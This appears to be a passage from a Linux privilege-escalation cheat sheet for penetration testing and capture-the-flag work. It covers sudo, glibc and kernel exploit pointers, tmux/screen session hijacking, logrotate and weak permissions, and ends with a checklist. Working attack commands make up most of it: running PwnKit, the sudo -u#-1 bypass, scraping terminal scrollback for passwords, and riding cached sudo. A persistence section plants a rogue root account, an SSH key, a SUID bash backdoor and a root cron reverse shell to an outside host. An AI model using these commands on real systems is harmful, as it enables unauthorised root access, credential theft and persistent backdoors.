# Buffer overflow in ld.so via GLIBC_TUNABLES during SUID binary launch
ldd --version | head -1          # glibc 2.34–2.38 → candidate
# PoC: https://github.com/leesh3288/CVE-2023-4911

# --- PwnKit (CVE-2021-4034) — any Linux with Polkit, regardless of kernel ---
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make
./PwnKit

# --- Dirty Pipe (kernel 5.8 – 5.16.11) ---
# Overwrites SUID binary with shellcode → root shell
# PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits

# --- Baron Samedit (sudo < 1.9.5p2) ---
# Heap overflow in sudo — NOPASSWD not needed
# PoC: https://github.com/blasty/CVE-2021-3156

# --- sudo -1 bypass (sudo < 1.8.28) ---
# If (ALL, !root) in sudoers:
sudo -u#-1 /bin/bash
```

> [!tip] Check **sudo and glibc versions before the kernel**. The sudo and glibc bugs (CVE-2025-32463, CVE-2023-4911, CVE-2021-3156) are userland — they're clean, reliable, and don't risk a panic, whereas kernel exploits do. A fully patched kernel on a box running sudo 1.9.15 is still an easy root.

> [!warning] Kernel exploits can panic the host and drop your shell along with everyone else's. On a real engagement they're the last resort, after sudo/SUID/capabilities/cron have all come up empty — and worth flagging to the client before you fire one.

---

## Hijacking tmux / screen Sessions

A **detached** terminal multiplexer session keeps running as the user who started it. Attaching to it gives you an interactive shell **as that user** — no password, no exploit, no SUID. Admins habitually leave a root tmux running for long jobs, so this is a clean and very common privesc when the socket permissions are sloppy.

### 1. Find the socket

tmux communicates over a **Unix domain socket**, by default `/tmp/tmux-<UID>/default` (UID `0` = root). A shared/misconfigured session is usually created explicitly with `-S` somewhere else.

```bash
# Default socket directories — note the UID in the dirname
ls -la /tmp/tmux-*/

# Is a tmux running, and as whom? The -S argument reveals a non-default socket path
ps aux | grep -i '[t]mux'
ps -eo user,pid,cmd | grep -i '[t]mux'

# Hunt sockets anywhere on disk
find / -type s 2>/dev/null | grep -iE 'tmux|screen'
find / -name '*tmux*' -o -name '*screen*' 2>/dev/null | grep -v proc
```

### 2. Check whether you can actually use it

This is the whole ballgame — you need **read+write** on the socket:

```bash
ls -la /tmp/tmux-0/default          # root's default socket
# srw-rw---- 1 root devs 0 Aug 13 10:22 /tmp/tmux-0/default
#      ^^^^ group rw + you in `devs` = you win

id                                   # are you in that group?
```

| Socket mode | Owner/group | Exploitable? |
|---|---|---|
| `srw-rw-rw-` | root:root | ✅ world-writable — attach directly |
| `srw-rw----` | root:`<group>` | ✅ **if `id` shows you in `<group>`** |
| `srw-rw----` | root:root | ❌ need to be root already |
| `srwx------` | root:root | ❌ default-safe |

### 3. Recon the scrollback first (passive — do this before attaching)

Before you touch their live terminal, **scrape the session's scrollback**. `capture-pane` reads the history of a *detached* session without disturbing it — completely invisible to the owner — and their command history routinely hands you a password or the escalation path outright.

```bash
# Dump a session's full scrollback to stdout. -S - = start of history, -E - = through the bottom.
tmux -S <socket> capture-pane -pt sadm_session -S - -E -

# (Your -S -32768 works too — it's just a bounded line count vs. "-" = all history.)

# Grep straight for secrets
tmux -S <socket> capture-pane -pt sadm_session -S - | grep -iE 'pass|pw|secret|token|key|sudo|mysql|ssh|curl|-u '

# Each window/pane has its OWN scrollback — enumerate, then capture each
tmux -S <socket> list-panes -s -t sadm_session -F '#{window_index}.#{pane_index} #{pane_current_command}'
tmux -S <socket> capture-pane -pt sadm_session:0.0 -S -    # repeat per pane
```

**Hunt for:** passwords typed *inline* (`mysql -p<pw>`, `curl -u u:p`, `sshpass`, `echo pw | sudo -S`), secrets in file output they viewed, and — most importantly — **evidence they run `sudo`** (sets up the cached-session trick below). Interactive password *prompts* won't appear (they don't echo).

### 4. Attach

```bash
# List sessions on that socket first (confirms access without disturbing anything)
tmux -S /tmp/tmux-0/default ls

# Attach → you are now that user
tmux -S /tmp/tmux-0/default attach

# Attach a specific session by name/number
tmux -S /shared/dev_sess attach -t 0

# Verify
id && whoami
```

> [!tip] **Ride a cached sudo timestamp.** `sudo` caches credentials per-tty for ~15 min. If the scrollback (step 3) shows the owner recently ran `sudo`, then once attached, `sudo` may not reprompt — you inherit their auth straight to root:
> ```bash
> sudo -n true && echo "CACHED — passwordless sudo is live" ; sudo -i
> ```
> `sudo -n` tests non-interactively so it won't hang on a prompt if the cache has expired. This is frequently *the* intended path on session-hijack boxes.

> [!tip] Use `tmux -S <socket> ls` before `attach`. If the socket is dead or unreadable you get a clean error instead of a hung terminal, and the listing tells you whether a session even exists to hijack.

> [!warning] **Attaching is not passive** — you share the *live* terminal with whoever else is attached. They see your keystrokes and you see theirs. On an engagement, prefer `tmux -S <sock> new-session -d 'id > /tmp/out'` to run a single command in a new detached session, or `send-keys -t <sess> '<cmd>' Enter` to fire one command — rather than joining the admin's live window. Use `attach -r` (read-only) if you only need to observe.

### GNU screen equivalent

```bash
# List sessions belonging to other users
screen -ls
ls -la /run/screen/            # or /var/run/screen/S-<user>/

# Attach (-x = multi-attach to an already-attached session, -r = reattach detached)
screen -r <pid>.<session>
screen -x root/<session>
```

> [!note] Old **setuid** `screen` builds (notably 4.5.0, CVE-2017-5618) had an arbitrary-file-write → root bug. Check `ls -la $(which screen)` for the SUID bit and `screen -v` for the version — that's a different, much more powerful bug than socket hijacking.

**Hardening (for the report):** tmux sockets should be mode `0700` under a per-user directory; never `chmod 777` a socket or place a shared session in a group-writable path. Root should not leave detached sessions running on multi-user hosts.

---

## Logrotate Exploitation

If logrotate runs as root and logs are in a writable location:

```bash
# Check logrotate config
cat /etc/logrotate.conf
ls /etc/logrotate.d/
# If a log file you can write to is rotated, use logrotten:
# https://github.com/whotwagner/logrotten
```

---

## Weak File Permissions Summary

```bash
# World-writable files NOT in /proc, /sys, /dev
find / -perm -o+w -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null

# World-writable directories
find / -perm -o+w -type d -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null

# Files owned by current user but run by root (scripts in cron, services)
find / -user $(whoami) -type f 2>/dev/null | grep -v "^/proc\|^/sys\|^/home/$(whoami)"

# Unowned files (orphaned — may indicate removed user)
find / -nouser -o -nogroup 2>/dev/null | grep -v "^/proc\|^/sys"
```

---

## Post-Exploitation — Persistence

```bash
# Add root user to /etc/passwd
echo 'haxroot:$1$hax$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

# Add SSH key to /root/.ssh/authorized_keys
mkdir -p /root/.ssh
echo '<your_public_key>' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# SUID bash backdoor
cp /bin/bash /tmp/.rootbash
chmod +s /tmp/.rootbash
/tmp/.rootbash -p

# Root cron reverse shell — MUST wrap in `bash -c` (cron's /bin/sh=dash can't parse /dev/tcp; see Cron Jobs warning)
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'" >> /etc/crontab
```

---

## Quick Reference Checklist

```bash
ENUMERATION
[ ] id, whoami, sudo -l
[ ] uname -a, cat /etc/os-release
[ ] cat /etc/passwd — unusual users with shells
[ ] cat /etc/crontab, ls /etc/cron.d/ — root cron jobs
[ ] ps aux | grep root — root-owned processes
[ ] ss -tulpn — local-only listening services
[ ] Run LinPEAS: /tmp/linpeas.sh | tee /tmp/out.txt

SUDO
[ ] sudo -l — what can you run?
[ ] Check GTFOBins for any allowed binary
[ ] Look for env_keep LD_PRELOAD in sudoers
[ ] sudo -u#-1 if (ALL, !root) policy (CVE-2019-14287)
[ ] sudo version: sudo --version
      < 1.9.5p2        → Baron Samedit (CVE-2021-3156)
      1.9.14 – 1.9.17  → chroot NSS load (CVE-2025-32463) — no sudoers entry needed
[ ] glibc version: ldd --version (2.34–2.38 → Looney Tunables CVE-2023-4911)

SUID / SGID
[ ] find / -perm -u=s -type f 2>/dev/null
[ ] Check GTFOBins for each unusual SUID binary
[ ] strings on custom SUID binaries — look for unqualified commands

CAPABILITIES
[ ] getcap -r / 2>/dev/null
[ ] cap_setuid+ep on any binary → instant root

CRON JOBS
[ ] Check /etc/crontab and /etc/cron.d/
[ ] Run pspy64 — catch cron jobs not visible in crontab
[ ] Check if scripts called by cron are writable
[ ] Check cron PATH for writable dirs before /usr/bin
[ ] Check for wildcard usage in cron commands (tar, rsync)

WRITABLE SENSITIVE FILES
[ ] ls -la /etc/passwd /etc/shadow /etc/sudoers
[ ] find / -user root -writable -not -path "/proc/*" 2>/dev/null

NFS
[ ] cat /etc/exports — look for no_root_squash
[ ] showmount -e <target> from attacker

CREDENTIALS
[ ] cat ~/.bash_history, ~/.zsh_history
[ ] grep -r "password" /var/www /home /opt /etc 2>/dev/null
[ ] find / -name "id_rsa" 2>/dev/null
[ ] Check /proc/*/environ for leaked env vars

HIJACKABLE SESSIONS
[ ] ls -la /tmp/tmux-*/ — sockets owned by another UID (tmux-0 = root)
[ ] ps aux | grep '[t]mux' — running as whom, and any -S custom socket path
[ ] find / -type s 2>/dev/null | grep -iE 'tmux|screen'
[ ] id — are you in the socket's group? (rw for group = attachable)
[ ] tmux -S <socket> ls — list sessions
[ ] tmux -S <socket> capture-pane -pt <sess> -S - | grep -iE 'pass|sudo|key'  ← PASSIVE recon first
[ ] tmux -S <socket> attach   then   sudo -n true && sudo -i   ← ride cached sudo
[ ] screen -ls / ls -la /run/screen/ — same idea for GNU screen

CONTAINERS
[ ] ls /.dockerenv — in Docker?
[ ] id | grep docker — docker group → instant root
[ ] id | grep lxd — LXD group → host FS access

KERNEL (last resort — can panic the host)
[ ] ./linux-exploit-suggester.sh
[ ] Check for PwnKit (pkexec) — works on all distros with Polkit
[ ] Dirty Pipe if kernel 5.8–5.16.11
[ ] nf_tables (CVE-2024-1086) if kernel 5.14–6.6 AND unprivileged userns enabled
      cat /proc/sys/kernel/unprivileged_userns_clone
[ ] Run Metasploit: use post/multi/recon/local_exploit_suggester
```

> See also: [[Windows Priv Esc]] for Windows-specific techniques

---

*Created: 2026-02-27*
*Updated: 2026-08-21*
*Model: claude-opus-5*
